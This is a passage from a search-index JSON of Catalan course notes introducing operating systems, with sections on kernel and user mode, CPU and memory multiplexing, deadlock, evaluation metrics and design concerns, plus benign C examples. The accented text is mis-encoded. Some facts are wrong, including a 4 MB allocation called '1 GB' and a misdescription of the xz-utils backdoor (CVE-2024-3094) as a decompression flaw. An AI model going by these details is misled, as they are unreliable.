optimitzats per a aplicacions espec√≠fiques.\n\nExemples: MirageOS, OSv, ClickOS.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#nivells-en-un-sistema-inform√†tic",
    "href": "notes/01-introduction.html#nivells-en-un-sistema-inform√†tic",
    "title": "Introducci√≥",
    "section": "Nivells en un Sistema Inform√†tic",
    "text": "Nivells en un Sistema Inform√†tic\nLa figura seg√ºent mostra les diferents capes d‚Äôun sistema inform√†tic. Aquestes capes es divideixen en dos grans grups:\n\nEn groc es representen els recursos f√≠sics (hardware), que inclouen components com la CPU, la mem√≤ria i els dispositius d‚Äôentrada/sortida.\nEn blau es representen els components software, amb especial atenci√≥ al sistema operatiu, que s‚Äôexecuta tant en mode usuari (verd) com en mode sistema (vermell), tamb√© conegut com a mode kernel.\n\n\n\n\nSistema Operatiu\n\n\n\nFunci√≥ del Mode Usuari i el Mode Sistema\nEls programes d‚Äôaplicaci√≥ (com el client de correu, el navegador web o el reproductor musical) s‚Äôexecuten en mode usuari, que √©s un entorn restringit on les aplicacions no poden accedir directament al maquinari ni a altres parts cr√≠tiques del sistema. Per garantir la seguretat i estabilitat del sistema, les aplicacions han de fer crides al sistema per accedir a funcionalitats gestionades pel sistema operatiu, com la gesti√≥ de fitxers o la comunicaci√≥ per xarxa.\nEl mode sistema (o mode kernel) √©s on s‚Äôexecuten les parts m√©s cr√≠tiques del sistema operatiu, com la gesti√≥ de recursos, els controladors de dispositius i altres serveis fonamentals. Aquest mode t√© acc√©s complet al maquinari, i √©s aqu√≠ on es prenen decisions importants sobre l‚Äô√∫s de recursos, l‚Äôassignaci√≥ de mem√≤ria i la planificaci√≥ de processos.\n\n\nComponents del Sistema Operatiu\nEl sistema operatiu es divideix en diverses capes, cadascuna responsable de funcions espec√≠fiques.\n\nL‚Äôinterf√≠cie d‚Äôusuari del sistema operatiu inclou serveis que poden ser utilitzats pels programes d‚Äôaplicaci√≥. Aquests serveis faciliten la interacci√≥ entre el programari d‚Äôusuari i el maquinari del sistema. Alguns exemples d‚Äôaquests serveis s√≥n:\n\nSistema de fitxers: Permet als programes crear, llegir, escriure i esborrar fitxers d‚Äôuna manera organitzada. Per exemple, un programa de processament de textos que guarda un document al disc dur interactua amb el sistema de fitxers per dur a terme aquesta operaci√≥.\nPlanificaci√≥ de processos: El sistema operatiu decideix quin proc√©s s‚Äôexecuta en cada moment. Per exemple, en un entorn multitarea, el sistema operatiu distribueix el temps de CPU entre m√∫ltiples programes en execuci√≥ com un navegador web i un editor de text, assegurant que cap d‚Äôells bloquegi els altres.\nMem√≤ria virtual: Aquesta funci√≥ permet que els programes utilitzin m√©s mem√≤ria del que hi ha f√≠sicament disponible. Per exemple, si un programa necessita m√©s mem√≤ria del que la RAM pot oferir, el sistema operatiu utilitza part del disc dur com a mem√≤ria virtual per simular un espai de mem√≤ria m√©s gran.\nProtocol TCP/IP: Proporciona serveis de comunicaci√≥ en xarxa, permetent que els programes es comuniquin a trav√©s d‚Äôinternet. Per exemple, un navegador utilitza aquest servei per enviar i rebre dades d‚Äôun servidor web.\n\nCapa d‚Äôabstracci√≥ de maquinari: Proporciona una interf√≠cie que amaga la complexitat del maquinari amb l‚Äôobjectiu de facilitar el desenvolupament d‚Äôaplicacions.\n\nPer exemple, un programador no necessita saber com funciona un disc dur espec√≠fic; el sistema operatiu ofereix una interf√≠cie que permet als programes accedir al disc d‚Äôuna manera consistent, independentment del model o fabricant del dispositiu.\n\n\n\n\nComponents en l‚ÄôEspai d‚ÄôUsuari\nEn l‚Äôespai d‚Äôusuari, tamb√© hi trobem diversos elements importants que faciliten la interacci√≥ amb el sistema operatiu:\n\nLes llibreries del sistema s√≥n col¬∑leccions de funcions que permeten als programes accedir als serveis del sistema operatiu. Quan un programa necessita realitzar una operaci√≥ privilegiada, com accedir a un fitxer o comunicar-se amb la xarxa, utilitza aquestes llibreries per fer una crida al sistema.\n\nExemple: Si un programa vol llegir un fitxer, pot utilitzar funcions de la llibreria stdio.h per fer-ho. Aquesta llibreria amaga els detalls t√®cnics i ens permet interactuar amb el maquinari de manera m√©s senzilla. En aquest cas, fopen() √©s una funci√≥ de la llibreria stdio.h que obre un fitxer per a lectura o escriptura.\n\nEls programes d‚Äôusuari s√≥n els programes que els usuaris executen directament, com navegadors web, editors de text o jocs. Aquests programes fan √∫s dels serveis del sistema operatiu mitjan√ßant les llibreries del sistema i poden interactuar amb l‚Äôusuari o altres programes.\n\nExemple: Un editor de text com VS Code interactua amb el sistema operatiu per obrir fitxers, mostrar contingut a la pantalla i rebre entrades de l‚Äôusuari (com tecles o clics de ratol√≠).\n\nEl shell √©s un programa especial que permet als usuaris interactuar directament amb el sistema operatiu a trav√©s d‚Äôuna interf√≠cie de l√≠nia de comandes (CLI). El shell interpreta les ordres de l‚Äôusuari i les tradueix en crides al sistema operatiu per dur a terme accions com llistats de directoris, copiar fitxers o executar programes.\n\nExemple: Quan un usuari introdueix l‚Äôordre ls en un terminal Unix, el shell tradueix aquesta ordre en una crida al sistema que llista els fitxers d‚Äôun directori.\n\n\nPer tant el sistema operatiu ens ofereix de forma transparent, usable, portable i efiicient una s√®rie de serveis que ens permeten interactuar amb el sistema inform√†tic:\n\nControl d‚Äôusuaris i aplicacions.\nGesti√≥ d‚Äôusuaris i aplicacions.\nGesti√≥ de la mem√≤ria.\nSistema de fitxers.\nPlanificadors.\nEines de xarxa.\n‚Ä¶",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#funcions-dun-sistema-operatiu-1",
    "href": "notes/01-introduction.html#funcions-dun-sistema-operatiu-1",
    "title": "Introducci√≥",
    "section": "Funcions d‚Äôun Sistema Operatiu",
    "text": "Funcions d‚Äôun Sistema Operatiu\nEl sistema operatiu actua com a √†rbitre entre els diferents programes i usuaris que competeixen pels recursos del sistema i com a il¬∑lusionista que proporciona una abstracci√≥ dels recursos f√≠sics per simular recursos il¬∑limitats aix√≤ s‚Äôaconsegueix gr√†cies a la virtualitzaci√≥.\nLa virtualitzaci√≥ √©s una tecnologia que permet crear una versi√≥ virtual d‚Äôun recurs f√≠sic o l√≤gic, com una m√†quina virtual, un sistema de fitxers o una xarxa. Molts autors defineixen un Sistema Operatiu com una m√†quina virtual que proporciona una interf√≠cie d‚Äôabstracci√≥ del maquinari real.\n\n1. Il¬∑lusionisme\nEl sistema operatiu proporciona una abstracci√≥ dels recursos f√≠sics. Aquesta capa d‚Äôabstracci√≥ permet als usuaris i desenvolupadors treballar amb conceptes l√≤gics en lloc de utilitzar directament els recursos f√≠sics del sistema.\n\nInterf√≠cie per als recursos f√≠sics: El sistema operatiu crea una interf√≠cie uniforme per als recursos f√≠sics, com el disc dur, la mem√≤ria i els dispositius d‚Äôentrada/sortida. A trav√©s d‚Äôaquesta interf√≠cie, els usuaris i aplicacions poden interactuar amb els recursos del sistema sense necessitat de con√®ixer el funcionament intern del maquinari.\n\nPer exemple: Quan un usuari treballa amb un fitxer, no pensa en blocs de dades en un disc dur. El sistema operatiu tradueix les operacions de fitxers (com crear, llegir o escriure) en operacions de blocs de disc. Aix√≤ fa que la gesti√≥ d‚Äôarxius sigui molt m√©s intu√Øtiva per a l‚Äôusuari. En el codi seg√ºent, es mostra com un programa pot obrir un fitxer, escriure-hi dades i tancar-lo sense haver de preocupar-se dels detalls de com s‚Äôemmagatzemen les dades al disc dur. Utilitza funcions de la llibreria stdio.h que proporcionen una interf√≠cie FILE i funcions com fopen(), fprintf() i fclose() per interactuar amb el fitxer.\n\n#include &lt;stdio.h&gt;\n\nint main() {\n    // Crear i obrir un fitxer per escriptura\n    FILE *file = fopen(\"example.txt\", \"w\");\n    if (file == NULL) {\n        perror(\"Error obrint el fitxer\");\n        return 1;\n    }\n\n    // Escriure dades al fitxer\n    fprintf(file, \"Hola, m√≥n!\\n\");\n\n    // Tancar el fitxer\n    fclose(file);\n\n    // Reobrir el fitxer per lectura\n    file = fopen(\"example.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"Error obrint el fitxer\");\n        return 1;\n    }\n\n    // Llegir i imprimir dades del fitxer\n    char buffer[100];\n    while (fgets(buffer, sizeof(buffer), file) != NULL) {\n        printf(\"%s\", buffer);\n    }\n\n    // Tancar el fitxer\n    fclose(file);\n    return 0;\n}\nMultiplexaci√≥ de recursos (temps i espai): El sistema operatiu gestiona els recursos del sistema a trav√©s de la multiplexaci√≥, una t√®cnica que permet compartir un mateix recurs entre m√∫ltiples usuaris o processos de manera simult√†nia o intercalada.\n\nMultiplexaci√≥ en el temps: En un sistema monoprocessador, el sistema operatiu (SO) divideix el temps de CPU entre diversos processos. Aix√≤ es fa mitjan√ßant la t√®cnica de canvi de context, que permet al processador alternar r√†pidament entre diferents tasques, creant la il¬∑lusi√≥ que totes s‚Äôestan executant simult√†niament.\n\n\nExemple: En un sistema amb m√∫ltiples aplicacions obertes (com un navegador web i un editor de text), el sistema operatiu gestiona el temps de CPU assignant petites fraccions de temps a cada aplicaci√≥. Aquest proc√©s √©s tan r√†pid que sembla que totes les aplicacions s‚Äôexecutin al mateix temps.\n\nUn exemple pr√†ctic senzill de multiplexaci√≥ en el temps es pot veure en un sistema operatiu que alterna l‚Äôexecuci√≥ de dos processos senzills (A i B). Per simular-ho en un sistema Unix/Linux, es pot utilitzar el seg√ºent codi que imprimeix informaci√≥ sobre el proc√©s actual i fa una pausa abans de continuar en un bucle infinit.\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    while (1) {\n        printf(\"Process %d is running\\n\", getpid());\n        sleep(1); // Simula una pausa abans de continuar\n    }\n    return 0;\n}\nPer compilar i executar aquest codi, seguiu aquests passos:\n$ vi process.c # Copieu el codi anterior en un fitxer process.c\n$ gcc process.c -o process\n$ ./process\nSi executeu aquest codi, veureu com el proc√©s imprimeix informaci√≥ sobre el seu PID (identificador de proc√©s) i es pausa durant un segon abans de continuar.\n$ ./process\nProcess 1234 is running\nProcess 1234 is running\nProcess 1234 is running\n...\nSi executeu aquest codi dues vegades en el mateix terminal, obtindreu una sortida com la seg√ºent:\n$ ./process & ./process &\n[1] 1234\n[2] 1235\nProcess 1234 is running\nProcess 1235 is running\nProcess 1234 is running\nProcess 1235 is running\n...\nEn aquest cas, el sistema operatiu alterna l‚Äôexecuci√≥ entre els dos processos, permetent que s‚Äôexecutin simult√†niament. Aquesta t√®cnica de** multiplexaci√≥ en el temps** permet que m√∫ltiples processos comparteixin el temps de CPU disponible.\nLes figures seg√ºents mostren com el sistema operatiu alterna l‚Äôexecuci√≥ entre dos processos (A i B) mitjan√ßant la t√®cnica de multiplexaci√≥ en el temps.\n\nCreaci√≥ de dos processos (A i B) : El sistema operatiu crea dos processos (A i B) i els carrega a la mem√≤ria.\n\n\n\n\nCreaci√≥ de processos\n\n\n\nEl planificador del sistema elegeix un dels processos (A) per a l‚Äôexecuci√≥ i carrega les seves dades a la CPU.\n\n\n\n\nExecuci√≥ de processos\n\n\n\nEl proc√©s A s‚Äôexecuta durant un temps determinat (1 segon) i despr√©s es posa en estat d‚Äôespera. El planificador elegir√† ara el proc√©s B per a l‚Äôexecuci√≥.\n\n\n\n\nExecuci√≥ de processos\n\n\nObservaci√≥: Si elimineu la crida sleep(1) del codi, els processos s‚Äôexecutaran tan r√†pidament que no podreu veure la sortida clara. Aix√≤ √©s degut a la velocitat d‚Äôexecuci√≥ i la rapidesa amb qu√® el sistema operatiu alterna entre els processos. A m√©s, no es pot assegurar que el sistema operatiu alterni entre els processos en un ordre espec√≠fic; aix√≤ dep√®n de la planificaci√≥ del sistema operatiu. √âs possible que un proc√©s s‚Äôexecuti m√©s vegades que l‚Äôaltre, depenent de la c√†rrega del sistema i d‚Äôaltres factors. Aquest fenomen es coneix com indeterminisme.\nPer tant, el sistema operatiu alterna utiltizant la t√®cnica de canvi de context per permetre que els dos processos s‚Äôexecutin simult√†niament. Els dos processos creuen que tenen acc√©s exclusiu a la CPU, per√≤ en realitat comparteixen el temps de CPU disponible.\n\nMultiplexaci√≥ en l‚Äôespai: El sistema operatiu (SO) divideix l‚Äôespai de mem√≤ria entre els diferents processos que s‚Äôexecuten. Cada proc√©s t√© assignada una part de la mem√≤ria f√≠sica, per√≤ utilitza una mem√≤ria virtual que li d√≥na la il¬∑lusi√≥ de tenir m√©s mem√≤ria disponible. Aix√≤ permet a cada aplicaci√≥ creure que t√© acc√©s exclusiu a la mem√≤ria, mentre que el SO gestiona l‚Äôacc√©s real.\n\n\nExemple: En un sistema amb 4 GB de RAM, el sistema operatiu pot utilitzar la t√®cnica de paginaci√≥ per permetre que m√∫ltiples programes ocupin m√©s espai del que hi ha disponible f√≠sicament, despla√ßant parts no utilitzades a un fitxer de paginaci√≥ en el disc dur.\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    int *ptr = malloc(1024 * 1024 * sizeof(int)); // Simula una gran quantitat de mem√≤ria\n    if (ptr == NULL) {\n        perror(\"No hi ha prou mem√≤ria\");\n        return 1;\n    }\n    printf(\"Mem√≤ria assignada\\n\");\n    free(ptr); // Alliberar la mem√≤ria\n    return 0;\n}\nEn aquest codi, es reserva una gran quantitat de mem√≤ria (1 GB) mitjan√ßant la funci√≥ malloc(). Encara que el sistema nom√©s disposi de 4 GB de RAM, el sistema operatiu pot gestionar la mem√≤ria virtual per permetre que aquesta operaci√≥ s‚Äôexecuti sense problemes. Quan la mem√≤ria ja no es necessita, es pot alliberar amb la funci√≥ free(). Aquesta t√®cnica permet als programes utilitzar m√©s mem√≤ria del que hi ha f√≠sicament disponible, millorant l‚Äôefici√®ncia del sistema.\nUn altre exemple que il¬∑lustra la multiplexaci√≥ en l‚Äôespai √©s el seg√ºent codi que mostra com dos processos poden compartir la mateixa adre√ßa de mem√≤ria:\n#include &lt;unistd.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;assert.h&gt;\n\nint main(int argc, char *argv[]) {\n    int *p = malloc(sizeof(int)); \n    assert(p != NULL);\n    printf(\"(%d) address pointed to by p: %p\\n\", getpid(), p); \n    *p = 0; \n    while (1) {\n        *p = *p + 1;\n        printf(\"(%d) p: %d\\n\", getpid(), *p); \n        }\n    return 0;\n}\nAquest codi crea un proc√©s que reserva mem√≤ria per a una variable p i incrementa el seu valor de manera indefinida.\nSi compiles i executes aquest codi, podr√†s veure com cada proc√©s imprimeix la mateixa adre√ßa de mem√≤ria, per√≤ amb valors que augmenten de manera independent:\n$ gcc memory.c -o memory\n$ ./memory\n(1234) address pointed to by p: 0x7f8b1c000010\n(1234) p: 1\n(1234) p: 2\n(1234) p: 3\n...\nSi executes aquest codi dues vegades en el mateix terminal:\n$ ./memory & ./memory &\n[1] 1234\n[2] 1235\n(1234) address pointed to by p: 0x7f8b1c000010\n(1235) address pointed to by p: 0x7f8b1c000010\n(1234) p: 1\n(1235) p: 1\n(1234) p: 2\n(1235) p: 2\n(1234) p: 3\n(1235) p: 3\n...\nEn aquest cas, els dos processos comparteixen la mateixa adre√ßa de mem√≤ria, per√≤ cada un t√© la il¬∑lusi√≥ que t√© acc√©s exclusiu a la mem√≤ria. Aquesta t√®cnica de multiplexaci√≥ en l‚Äôespai permet als processos utilitzar la mem√≤ria de manera eficient, sense interferir entre ells.\nOptimitzaci√≥ del rendiment del hardware: Els sistemes operatius poden optimitzar l‚Äô√∫s dels recursos hardware per maximitzar el rendiment. Aix√≤ inclou tasques com la gesti√≥ intel¬∑ligent de la mem√≤ria, la planificaci√≥ de l‚Äô√∫s de la CPU o la distribuci√≥ de la c√†rrega en entorns de m√∫ltiples processadors.\n\nExemple: Els sistemes MacOS s√≥n altament optimitzats per funcionar amb components de hardware espec√≠fics dels Macs, aconseguint un rendiment m√©s eficient que sistemes com Windows, que han de suportar una gran varietat de configuracions de hardware.\n\n\n\n\n2. Arbitratge\nEl sistema operatiu actua com un √†rbitre entre els diferents processos que competeixen pels recursos del sistema. Aquest arbitratge assegura que els recursos s‚Äôutilitzin de manera justa i eficient, evitant conflictes i millorant el rendiment general.\n\nGesti√≥ de recursos: El SO decideix com distribuir els recursos limitats (com la CPU, la mem√≤ria o dispositius d‚ÄôE/S) entre els diferents programes que s‚Äôexecuten. Aix√≤ inclou la planificaci√≥ de processos, la gesti√≥ de la mem√≤ria i el control de l‚Äôacc√©s als dispositius de hardware.\n\nExemple: Quan diversos processos volen accedir a la impressora simult√†niament, el sistema operatiu gestiona una cua d‚Äôimpressi√≥, decidint quin proc√©s pot utilitzar la impressora i en quin ordre, assegurant que els processos s‚Äôexecuten en funci√≥ de la seva prioritat o temps d‚Äôespera.\n\nEvitaci√≥ de conflictes i bloquejos: Un altre aspecte important de l‚Äôarbitratge √©s evitar els bloquejos (deadlocks), que ocorren quan dos o m√©s processos es queden esperant indefinidament que un recurs es faci disponible. El sistema operatiu utilitza t√®cniques com la prevenci√≥ de bloquejos o la detenci√≥ de bloquejos per gestionar aquests conflictes.\nExemple: Considerem un escenari on dos processos, A i B, necessiten accedir a dos recursos compartits, X i Y, per completar les seves operacions. Suposem que el recurs X √©s una impressora i el recurs Y √©s una mem√≤ria USB. El proc√©s A necessita imprimir un document i despr√©s guardar-lo a la mem√≤ria USB, mentre que el proc√©s B necessita guardar un document a la mem√≤ria USB i despr√©s imprimir-lo.\nSi el proc√©s A adquireix primer la impressora (recurs X) i despr√©s intenta accedir a la mem√≤ria USB (recurs Y), i al mateix temps el proc√©s B adquireix primer la mem√≤ria USB (recurs Y) i despr√©s intenta accedir a la impressora (recurs X), es produeix una situaci√≥ de bloqueig coneguda com a ‚Äúdeadlock‚Äù. En aquest cas, el proc√©s A espera indefinidament per accedir al recurs Y que el proc√©s B ja ha bloquejat, mentre que el proc√©s B espera indefinidament per accedir al recurs X que el proc√©s A ja ha bloquejat. Com a resultat, ambd√≥s processos es bloquegen m√∫tuament i cap d‚Äôells no pot completar la seva tasca. El SO ha de detectar aquesta situaci√≥ i prendre mesures per evitar-la. Una soluci√≥, seria elimanar el proc√©s B, esperar la finalitzaci√≥ de A i tornar a executar B.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#m√®triques-davaluaci√≥-dels-sistemes-operatius",
    "href": "notes/01-introduction.html#m√®triques-davaluaci√≥-dels-sistemes-operatius",
    "title": "Introducci√≥",
    "section": "M√®triques d‚Äôavaluaci√≥ dels Sistemes Operatius",
    "text": "M√®triques d‚Äôavaluaci√≥ dels Sistemes Operatius\nEls sistemes operatius s√≥n complexos i han de satisfer una s√®rie de requisits en funci√≥ de les seves finalitats i entorns d‚Äô√∫s. Com satisfer tots aquests requisits √©s una tasca dif√≠cil, es fan servir una s√®rie de m√®triques per avaluar el rendiment i la qualitat dels sistemes operatius en funci√≥ de diferents m√®triques.\n\nOverhead: Quantitat de recursos addicionals que un sistema operatiu utilitza per gestionar els recursos del sistema. Aquest overhead pot afectar el rendiment general del sistema, ja que els recursos que s‚Äôutilitzen pel sistema operatiu no estan disponibles per a les aplicacions.\nFairness: Capacitat del sistema operatiu de distribuir els recursos de manera justa entre els diferents processos. Un sistema operatiu just assegura que tots els processos tinguin acc√©s als recursos del sistema de manera equitativa, sense privilegiar uns processos sobre altres.\nTemps de resposta: Temps que triga un sistema en respondre a una sol¬∑licitud de l‚Äôusuari. Un sistema operatiu eficient ha de ser capa√ß de respondre r√†pidament a les sol¬∑licituds dels usuaris, minimitzant el temps de resposta i millorant la interactivitat del sistema.\nThroughput: Quantitat de treball que un sistema pot realitzar en una unitat de temps. Un sistema operatiu amb un alt throughput √©s capa√ß de processar un gran nombre de tasques simult√†niament, millorant l‚Äôefici√®ncia del sistema i reduint els temps d‚Äôespera dels usuaris.\nFiabilitat: Capacitat de mantenir-se operatiu durant llargs per√≠odes de temps sense fallar. Un sistema fiable ha de ser capa√ß de recuperar-se de fallades inesperades i mantenir la integritat dels recursos del sistema.\nDisponibilitat: Capacitat de mantenir-se operatiu i accessible per als usuaris en tot moment. Un sistema altament disponible ha de ser capa√ß de gestionar c√†rregues de treball variables i mantenir la seva funcionalitat en situacions de sobrec√†rrega o fallades.\nPredictibilitat: Capacitat de mantenir un comportament consistent i previsible en diferents situacions. Un sistema previsible ha de ser capa√ß de respondre de manera coherent a les sol¬∑licituds dels usuaris i mantenir un rendiment estable en tot moment.\nIntegritat: Capacitat de protegir els recursos del sistema contra atacs i amenaces externes. Un sistema amb una bona integritat ha de ser capa√ß de mantenir la confidencialitat, la integritat i la disponibilitat dels recursos del sistema en tot moment.\nPrivacitat: Capacitat de protegir les dades dels usuaris i garantir la confidencialitat de la informaci√≥ personal. Un sistema amb una bona privacitat ha de ser capa√ß de protegir les dades dels usuaris contra l‚Äô√∫s no autoritzat i garantir la seguretat de la informaci√≥.\nSeguretat: Capacitat de protegir els recursos del sistema contra atacs i vulnerabilitats. Un sistema segur ha de ser capa√ß de detectar i respondre a amenaces de seguretat, com ara virus, malware o atacs cibern√®tics, i mantenir la integritat del sistema en tot moment.\nEscalabilitat: Capacitat de cr√©ixer i adaptar-se a les necessitats dels usuaris. Un sistema escalable ha de ser capa√ß de gestionar c√†rregues de treball variables i augmentar la seva capacitat de processament i emmagatzematge segons sigui necessari.\nPortabilitat: Capacitat de ser executat en diferents plataformes i arquitectures de maquinari. Un sistema port√†til ha de ser capa√ß de funcionar en una √†mplia varietat de dispositius i entorns sense necessitat de modificacions.",
    "crumbs": [
      "Apunts",
      "Unitat 01 ¬∑Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "notes/01-introduction.html#disseny-de-sistemes-operatius",
    "href": "notes/01-introduction.html#disseny-de-sistemes-operatius",
    "title": "Introducci√≥",
    "section": "Disseny de Sistemes Operatius",
    "text": "Disseny de Sistemes Operatius\nEl disseny d‚Äôun sistema operatiu (SO) √©s una tasca complexa que requereix la creaci√≥ d‚Äôuna sistema robust, segur i eficient per gestionar el maquinari i proporcionar serveis als usuaris i aplicacions. Els dissenyadors de sistemes operatius han de tenir en compte una varietat de factors per assegurar que el sistema compleixi amb els requisits de rendiment, seguretat i funcionalitat ,maximitzant o minimizant les m√®triques d‚Äôavaluaci√≥ discutides anteriorment.\n\nComplexitat de la Programaci√≥ Distribu√Øda: Els sistemes operatius han de gestionar entorns distribu√Øts. Aix√≤ implica coordinar m√∫ltiples nodes, mantenir la coher√®ncia de dades i gestionar les comunicacions en xarxa. Aquesta complexitat es veu amplificada en sistemes com el n√∫vol (cloud computing).\nComplexitat de la Programaci√≥ Concorrent: Els sistemes operatius han de gestionar m√∫ltiples processos i fils d‚Äôexecuci√≥ de manera eficient. Aix√≤ implica la gesti√≥ de la sincronitzaci√≥, la comunicaci√≥ i la compartici√≥ de recursos entre els processos.\nComplexitat pel Context (M√≤bil, IoT, Servidors): Els SO per a dispositius m√≤bils, Internet de les Coses (IoT) i servidors tenen requisits espec√≠fics que influeixen en el seu disseny. Per exemple, iOS i Android han de ser √†gils i adaptatius per a diverses condicions d‚Äô√∫s (interficies t√†ctils, usuaris en constant moviment), mentre que sistemes com Linux per a servidors han de gestionar c√†rregues elevades i proporcionar alta disponibilitat.\nComplexitat per la Heterogene√Øtat del Hardware: La diversitat en els components de maquinari presenta reptes significatius en la compatibilitat i el rendiment. Els dissenyadors han de desenvolupar sistemes operatius que puguin adaptar-se a diverses arquitectures de maquinari, cosa que pot requerir solucions innovadores per garantir un rendiment √≤ptim. Avui en dia, tenim processadors de diferents fabricants (Intel, AMD, ARM), xarxes de comunicaci√≥ diverses (Ethernet, Wi-Fi, 5G) i dispositius d‚Äôemmagatzematge amb tecnologies variades (SSD, HDD, cintes magn√®tiques). Els SO han de ser capa√ßos de gestionar aquesta diversitat de manera eficient.\nPortabilitat: La capacitat d‚Äôun SO per ser executat en diferents plataformes de maquinari √©s essencial. Un exemple de portabilitat √©s Java, amb la seva m√†quina virtual (JVM) que permet executar aplicacions en diverses plataformes sense necessitat de recompilaci√≥. Els contenidors Docker s√≥n un altre exemple de portabilitat, ja que permeten als desenvolupadors executar aplicacions en entorns a√Øllats sense depend√®ncies de la plataforma.\nSeguretat: Els dissenyadors han de tenir en compte les vulnerabilitats de seguretat, com ara atacs de dia zero, malware i vulnerabilitats de xarxa. Sistemes com SELinux i AppArmor ofereixen funcions de seguretat avan√ßades per protegir els sistemes contra amenaces. Per exemple, al 2024, va sorgir una vulnerabilitat que afectava gaireb√© a tots els sistemes linux. Aquesta vulnerabilitat es coneix com en xz-utils identificada com CVE-2024-3094. Podeu trobar m√©s informaci√≥ sobre aquesta vulnerabilitat a CVE-2024-3094. Aquesta vulnerabilitat permetia que un atacant execut√©s codi malici√≥s amb privilegis elevats mitjan√ßant un fitxer especialment manipulat que explota una debilitat en el proc√©s de descompressi√≥ de fitxers.\nEfici√®ncia: Els SO han de ser eficients en l‚Äô√∫s dels recursos del sistema, com la CPU, la mem√≤ria i el disc dur. Aix√≤ implica optimitzar els algorismes i les estructures de dades per garantir un rendiment √≤ptim.\nEscalabilitat: Els SO han de ser capa√ßos de cr√©ixer amb les necessitats del sistema, ja sigui en termes de c√†rrega de treball, nombre d‚Äôusuaris o mida de la xarxa. Aix√≤ implica dissenyar sistemes que puguin adaptar-se a canvis en les condicions del sistema i mantenir un rendiment estable en tot moment.\nMantenibilitat: Els SO han de ser f√†cils de mantenir i actualitzar per garantir un funcionament continu i sense interrupcions. Aix√≤ implica dissenyar sistemes amb una arquitectura clara i modular que permeti fer canvis i millores sense afectar la funcionalitat existent.\nCompatibilitat: Els SO han de ser compatibles amb una √†mplia gamma de programari i dispositius per garantir una transici√≥ suau entre versions i maximitzar l‚Äô√∫s de programari existent. Aix√≤ implica dissenyar sistemes que puguin interactuar amb una varietat de dispositius i aplicacions sense problemes.\nUsabilitat: Els SO han de ser f√†cils d‚Äôutilitzar i entendre per als usuaris, amb una interf√≠cie clara i intu√Øtiva que faciliti la interacci√≥ amb el sistema. Aix√≤ implica dissenyar sistemes amb una interf√≠cie d‚Äôusuari coherent i funcionalitats accessibles per a tots els usuaris.\nAdaptabilitat: Els SO han de ser capa√ßos d‚Äôadaptar-se a canvis en l‚Äôentorn del sistema, com ara actualitzacions de programari, canvis en la c√†rrega de treball o noves tecnologies. Aix√≤ implica dissenyar sistemes que puguin evolucionar amb el temps i mantenir la seva funcionalitat en situacions canviants.\nToler√†ncia a Fallades: Els SO han de ser tolerants a fallades per garantir la integritat del sistema en cas de problemes. Aix√≤ implica dissenyar sistemes que puguin recuperar-se de fallades inesperades i mantenir la seva operaci√≥ en situacions advers\nTranspar√®ncia: Els SO han de ser transparents per als usuaris i desenvolupadors, amb una interf√≠cie clara i consistent que permeti interactuar amb el sistema de manera senzilla. Aix√≤ implica dissenyar sistemes amb una interf√≠cie d‚Äôusuari coherent i funcionalitats accessibles per a tots els usuaris.\n\n\nCas pr√†ctic: Vehicle aut√≤nom\nImaginem que estem dissenyant un sistema operatiu per a un vehicle aut√≤nom. Quins serien els requisits clau que haur√≠em de tenir en compte en el disseny del sistema operatiu?\n\nSeguretat: La seguretat √©s una prioritat en un vehicle aut√≤nom, ja que ha de garantir que el vehicle no pugui ser controlat remotament per un atacant malintencionat. Aix√≤ implica implementar mesures de seguretat com xifrat de comunicacions, autenticaci√≥ robusta i protecci√≥ contra vulnerabilitats conegudes. A m√©s, s‚Äôhan de protegir les dades sensibles, com les dades de localitzaci√≥ i informaci√≥ personal dels passatgers.\nToler√†ncia a fallades: El sistema ha de ser tolerant a fallades, amb mecanismes per detectar, a√Øllar i recuperar-se de errors. Aix√≤ implica utilitzar t√®cniques com la redund√†ncia de components i sistemes, aix√≠ com implementar mecanismes de recuperaci√≥ i reconfiguraci√≥ autom√†tica en cas de fallades. La capacitat de recuperaci√≥ ha de permetre al vehicle continuar funcionant amb seguretat fins i tot en cas de fallades parcials. Els accidents no poden ser una opci√≥.\nGesti√≥ de recursos: El sistema ha de gestionar eficientment els recursos del vehicle, com la CPU, la mem√≤ria i els sensors. Ha de prioritzar les tasques cr√≠tiques per a la conducci√≥ segura, com la detecci√≥ de obstacles i la presa de decisions en temps real, mentre optimitza altres processos per a un rendiment global equilibrat.\nAdaptabilitat: Ha de ser capa√ß d‚Äôadaptar-se a canvis en les condicions de la carretera, com variacions en el clima, el tr√†nsit i l‚Äôestat de les carreteres. Aix√≤ requereix una infraestructura flexible i adaptable que pugui ajustar les estrat√®gies de conducci√≥ i la gesti√≥ dels recursos en resposta a les condicions din√†miques.\n\n\n\nCas pr√†ctic: Sistema operatiu d‚Äôun tel√®fon m√≤bil\nAra, considerem el sistema operatiu d‚Äôun tel√®fon m√≤bil:\n\nUsabilitat: La interf√≠cie ha de ser f√†cil d‚Äôutilitzar i intuitiva per als usuaris, amb funcionalitats accessibles i una navegaci√≥ clara. Ha de permetre als usuaris interactuar amb el dispositiu de manera efica√ß i senzilla, amb opcions de personalitzaci√≥ i configuraci√≥ per adaptar-se a les prefer√®ncies de l‚Äôusuari.\nCompatibilitat: Ha de ser compatible amb una √†mplia gamma d‚Äôaplicacions i serveis, assegurant-se que les aplicacions funcionin correctament en diferents models de dispositius i versions del sistema operatiu. Aix√≤ implica la gesti√≥ de la compatibilitat amb hardware divers i la integraci√≥ amb serveis de tercers.\nSeguretat de dades: El sistema operatiu ha de protegir la privacitat i la confidencialitat de les dades dels usuaris. Aix√≤ implica implementar mesures de seguretat com xifrat de dades emmagatzemades i en tr√†nsit, control d‚Äôaccessos a aplicacions, i actualitzacions de seguretat regulars per abordar vulnerabilitats noves.\nEficiencia energ√®tica: 